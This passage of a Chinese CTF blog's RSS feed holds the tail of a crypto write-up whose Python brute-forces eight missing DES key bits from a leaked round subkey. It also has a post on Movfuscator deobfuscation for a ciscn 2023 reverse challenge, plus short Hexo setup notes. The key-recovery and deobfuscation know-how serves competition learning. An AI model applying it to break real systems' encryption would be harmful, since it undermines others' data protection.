<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"><span class="comment"># Despermuted[48]</span></span><br><span class="line">PC2 = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line"><span class="comment"># DesRotations</span></span><br><span class="line">movnum = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]<span class="comment">#对应16轮中每一轮的循环左移位数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">C1,D1,k</span>):</span><br><span class="line">    tempc=C1</span><br><span class="line">    tempd=D1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">        tempc = tempc[<span class="number">1</span>:] + tempc[:<span class="number">1</span>]</span><br><span class="line">        tempd = tempd[<span class="number">1</span>:] + tempd[:<span class="number">1</span>]</span><br><span class="line">    tempCD1=tempc+tempd</span><br><span class="line">    tempkey=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(PC2)):</span><br><span class="line">        tempkey.append(tempCD1[PC2[i]-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> (tempkey,tempCD1)<span class="comment">#轮运算得到下一轮子密钥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re_gen_key</span>(<span class="params">C1,D1</span>):</span><br><span class="line">    tempc=C1[-<span class="number">1</span>:]+C1[:-<span class="number">1</span>]</span><br><span class="line">    tempd=D1[-<span class="number">1</span>:]+D1[:-<span class="number">1</span>]</span><br><span class="line">    tempCD1=tempc+tempd</span><br><span class="line">    <span class="keyword">return</span> tempCD1 <span class="comment">#轮运算得到上一轮CD</span></span><br><span class="line"></span><br><span class="line">d = pyDes.des(<span class="string">&quot;0&quot;</span>*<span class="number">8</span>)</span><br><span class="line">CD = [<span class="string">&#x27;*&#x27;</span>]*<span class="number">56</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得PC-2置换前的数据，即56位密钥，当然其中有8位我们依然是未知的</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(PC2)):</span><br><span class="line">    CD[PC2[i]-<span class="number">1</span>] = Kn[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="comment"># 遍历2^8种可能</span></span><br><span class="line">    temp = CD[::]</span><br><span class="line">    bi = <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">    tot = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(temp)):</span><br><span class="line">        <span class="keyword">if</span> temp[j] == <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">            temp[j] = <span class="built_in">int</span>(bi[tot])  <span class="comment"># 将丢失的8位填充进去</span></span><br><span class="line">            tot += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 回到初始密钥</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">sum</span>(movnum[:<span class="number">8</span>])):  <span class="comment"># 逆向循环左移操作，回到最初的密钥形态</span></span><br><span class="line">        temp = re_gen_key(temp[:<span class="number">28</span>],temp[<span class="number">28</span>:])</span><br><span class="line"></span><br><span class="line">    tempK=[]</span><br><span class="line">    Z = temp</span><br><span class="line">    <span class="comment"># 16轮迭代重新生成新的子密钥</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        tempx=gen_key(Z[:<span class="number">28</span>],Z[<span class="number">28</span>:],movnum[j])</span><br><span class="line">        tempK.append(tempx[<span class="number">0</span>])</span><br><span class="line">        Z=tempx[<span class="number">1</span>]</span><br><span class="line">    d.Kn = tempK</span><br><span class="line">    <span class="built_in">print</span>(d.decrypt(enc))  <span class="comment"># 使用子密钥解密消息</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;HNCTF&quot;&gt;&lt;a href=&quot;#HNCTF&quot; class=&quot;headerlink&quot; title=&quot;HNCTF&quot;&gt;&lt;/a&gt;HNCTF&lt;/h1&gt;&lt;h2 id=&quot;baBAbaseSEse（base家族）&quot;&gt;&lt;a href=&quot;#baBAbase</summary>
      
    
    
    
    <category term="Crypto" scheme="https://kidder1.github.io/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="https://kidder1.github.io/tags/Crypto/"/>
    
    <category term="Math" scheme="https://kidder1.github.io/tags/Math/"/>
    
  </entry>
  
  <entry>
    <title>Movfuscator混淆研究</title>
    <link href="https://kidder1.github.io/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/"/>
    <id>https://kidder1.github.io/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/</id>
    <published>2023-07-19T07:05:36.000Z</published>
    <updated>2023-08-02T10:01:56.769Z</updated>
    
    <content type="html"><![CDATA[<h1 id="混淆器"><a href="#混淆器" class="headerlink" title="混淆器"></a>混淆器</h1><p>在mov指令的图灵完备性被证明之后，就产生了一种使用mov指令代替其他各种指令的混淆机制，运算，跳转，函数调用都可以全部使用mov指令实现。</p><p>Githhub链接：<a href="https://github.com/xoreaxeaxeax/movfuscator">https://github.com/xoreaxeaxeax/movfuscator</a> 按照github安装之后，正常编译就行</p><h1 id="解混淆器"><a href="#解混淆器" class="headerlink" title="解混淆器"></a>解混淆器</h1><p>Github链接：<a href="https://github.com/kirschju/demovfuscator">https://github.com/kirschju/demovfuscator</a></p><p>这个需要三个库：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">- libcapstone</span><br><span class="line">sudo git clone https:<span class="comment">//github.com/aquynh/capstone.git</span></span><br><span class="line">cd capstone/</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">- libz3</span><br><span class="line">sudo git clone https:<span class="comment">//github.com/Z3Prover/z3.git</span></span><br><span class="line">cd z3</span><br><span class="line">python scripts/mk_make.py</span><br><span class="line">cd build</span><br><span class="line">make</span><br><span class="line">sudo make install </span><br><span class="line">- libkeystone</span><br><span class="line">sudo git clone https:<span class="comment">//github.com/keystone-engine/keystone.git</span></span><br><span class="line">cd keystone/</span><br><span class="line">sudo mkdir build</span><br><span class="line">cd build/</span><br><span class="line">sudo ../make-share.sh </span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br><span class="line">- demovfuscator </span><br><span class="line">git clone https:<span class="comment">//github.com/kirschju/demovfuscator.git</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure><ul><li>思路mov混淆的解决方式：<ol><li>简单的，会在某个寄存器中出现，全局搜索该寄存器后可以得出结果</li><li>或者可以使用动态调试出结果</li><li>难的，需要爆破</li><li>使用工具 https:&#x2F;&#x2F;<a href="https://so.csdn.net/so/search?q=github&spm=1001.2101.3001.7020">github</a>.com&#x2F;kirschju&#x2F;demovfuscator</li><li>找到字符串然后根据读写断点观察输入在内存的变化找到&#x2F;猜测加密逻辑</li></ol></li></ul><h1 id="例子ciscn-2023-moveAside"><a href="#例子ciscn-2023-moveAside" class="headerlink" title="例子ciscn 2023 moveAside"></a>例子ciscn 2023 moveAside</h1><p>这道题mov混淆呢，当时没有做出来，现在看了一些师傅的题解，稍微复盘总结一</p><h2 id="查找字符串"><a href="#查找字符串" class="headerlink" title="查找字符串"></a>查找字符串</h2><p>找到字符串向上翻阅</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230719171047390.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230719171047390.png"  class="" lazyload></a><p>可以找到密文，这里我已经转成数组形式了</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230719171223774.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230719171223774.png"  class="" lazyload></a><p>这里可以得到字符串长度是44</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230719172931878.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230719172931878.png"  class="" lazyload></a><p>然后这里直接下断点调试的话是会触发异常的，可以看到这里调用了sigaction函数</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720092516751.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720092516751.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720092828038.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720092828038.png"  class="" lazyload></a><p>IDA这个异常处理的过程我一直不是很了解,根据搜索字符串然后下断点调试再试试</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720102536313.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720102536313.png"  class="" lazyload></a><p>这里又触发异常了，这里设置成这样好像就不会有提示了</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720102714851.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720102714851.png"  class="" lazyload></a><p>然后这个一直按着F9调试一直等到所有的停住即可</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720110254452.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720110254452.png"  class="" lazyload></a><p>然后一直没有反应，在密文那块下了一个读写断点</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720111141895.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720111141895.png"  class="" lazyload></a><p>密文长度</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720111254827.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230720111254827.png"  class="" lazyload></a><p>跳不出来，，，我晕了。。。。算了还是太菜了。。。</p><h2 id="用工具"><a href="#用工具" class="headerlink" title="用工具"></a>用工具</h2><p>这个破工具装了一下午，刚开始在ubuntu18上面，结果那个clang的版本不够，然后有在22上面装，结果编译那个库编译了几十分钟，然后我又make -j8，才搞好。</p><p>试试效果怎么样</p><a class="simple-lightbox" href="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230719182131996.png"><img   src="/images/loading.svg" data-src="/2023/07/19/Movfuscator%E6%B7%B7%E6%B7%86%E7%A0%94%E7%A9%B6/image-20230719182131996.png"  class="" lazyload></a><p>好吧，结果惨不忍睹，不能运行，不能反编译，跟没用一样。。。大概也就这样，这玩意肯定工程上面用不上，只能对简单的程序进行一些操作，也只能在CTF这里玩完了，但不妨碍它是一个伟大的发明。</p><p>参考博客</p><p><a href="https://blog.csdn.net/CherestSan/article/details/117608664">(121条消息) movfuscator混淆_mov混淆_Cherest_San的博客-CSDN博客</a></p><p> <a href="https://blog.csdn.net/weixin_52118017/article/details/130997247">CISCN 2023 初赛]moveAside_FeiJiNcFan的博客-CSDN博客</a></p><p><a href="https://or4ngesec.github.io/post/ciscn-2023-writeup-by-or4nge/#moveaside">CISCN2023 初赛 Writeup by or4nge (or4ngesec.github.io)</a></p><p><a href="https://blog.csdn.net/qq_33438733/article/details/79860304">(121条消息) movfuscator混淆了解一下 CTF_mov混淆_坚强的女程序员的博客-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;混淆器&quot;&gt;&lt;a href=&quot;#混淆器&quot; class=&quot;headerlink&quot; title=&quot;混淆器&quot;&gt;&lt;/a&gt;混淆器&lt;/h1&gt;&lt;p&gt;在mov指令的图灵完备性被证明之后，就产生了一种使用mov指令代替其他各种指令的混淆机制，运算，跳转，函数调用都可以全部使用mov指</summary>
      
    
    
    
    <category term="Reverse" scheme="https://kidder1.github.io/categories/Reverse/"/>
    
    
    <category term="Reverse" scheme="https://kidder1.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Hexo使用手册</title>
    <link href="https://kidder1.github.io/2023/07/18/Hexo%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/"/>
    <id>https://kidder1.github.io/2023/07/18/Hexo%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</id>
    <published>2023-07-18T01:30:09.000Z</published>
    <updated>2023-08-02T09:56:03.516Z</updated>
    
    <content type="html"><![CDATA[<p>Hexo使用说明</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo n  # 创建文章</span><br><span class="line">hexo cl # 清理缓存</span><br><span class="line">hexo g  # 生成博客</span><br><span class="line">hexo s  # 本地部署</span><br><span class="line">hexo d  # 上线部署</span><br></pre></td></tr></table></figure><a class="simple-lightbox" href="/2023/07/18/Hexo%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/image-20230718094005578.png"><img   src="/images/loading.svg" data-src="/2023/07/18/Hexo%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/image-20230718094005578.png"  class="" title="This is an test image" lazyload></a><p>插入图片的话，安装插件，然后用下面的格式进行插入即可，图片描述可以自行修改</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img imageName imageDescription %&#125;</span><br></pre></td></tr></table></figure><p>博客的分类标签摘要等配置看下图即可</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">title: Hexo使用说明</span><br><span class="line">date: 2023-07-18 09:30:09</span><br><span class="line">author: Kidder1</span><br><span class="line">summary: Hexo使用简要说</span><br><span class="line">categories: Begin</span><br><span class="line">tag: </span><br><span class="line">- Begin </span><br><span class="line">- Hexo</span><br></pre></td></tr></table></figure><p>在根目录下面设置了两个sh文件，无论部署还是测试直接运行即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Hexo使用说明&lt;/p&gt;
&lt;figure class=&quot;highlight text&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;</summary>
      
    
    
    
    <category term="Begin" scheme="https://kidder1.github.io/categories/Begin/"/>
    
    
    <category term="Begin" scheme="https://kidder1.github.io/tags/Begin/"/>
    
    <category term="Hexo" scheme="https://kidder1.github.io/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>博客配置说明书</title>
    <link href="https://kidder1.github.io/2023/07/17/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E%E4%B9%A6/"/>
    <id>https://kidder1.github.io/2023/07/17/%E5%8D%9A%E5%AE%A2%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E%E4%B9%A6/</id>
    <published>2023-07-16T16:00:00.000Z</published>
    <updated>2023-08-02T08:36:43.656Z</updated>
    
    <content type="html"><![CDATA[<p>主题配置说明书：<a href="https://minimalism.codeover.cn/docs/introduction">https://minimalism.codeover.cn/docs/introduction</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;主题配置说明书：&lt;a href=&quot;https://minimalism.codeover.cn/docs/introduction&quot;&gt;https://minimalism.codeover.cn/docs/introduction&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Begin" scheme="https://kidder1.github.io/categories/Begin/"/>
    
    
  </entry>
  
  <entry>
    <title>转站说明</title>
    <link href="https://kidder1.github.io/2023/07/17/%E8%AF%B4%E6%98%8E/"/>
    <id>https://kidder1.github.io/2023/07/17/%E8%AF%B4%E6%98%8E/</id>
    <published>2023-07-16T16:00:00.000Z</published>
    <updated>2023-08-02T09:10:16.610Z</updated>
    
    <content type="html"><![CDATA[<p>懒得维护这么一个网站，东西越多，事情越多，很多东西不能专注，然后就会报复性的放松和逃避，我想这不是一个解决事情的好办法。想来想去，还是决定从一个新的地方开始了。<br>美化的尽头总是简约了，目的还是记录一些后面可以用的到的东西。关于我有我的微信，希望大家喜欢和和多多交流。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;懒得维护这么一个网站，东西越多，事情越多，很多东西不能专注，然后就会报复性的放松和逃避，我想这不是一个解决事情的好办法。想来想去，还是决定从一个新的地方开始了。&lt;br&gt;美化的尽头总是简约了，目的还是记录一些后面可以用的到的东西。关于我有我的微信，希望大家喜欢和和多多交流。&lt;</summary>
      
    
    
    
    <category term="Begin" scheme="https://kidder1.github.io/categories/Begin/"/>
    
    
    <category term="Begin" scheme="https://kidder1.github.io/tags/Begin/"/>
    
  </entry>
  
</feed>
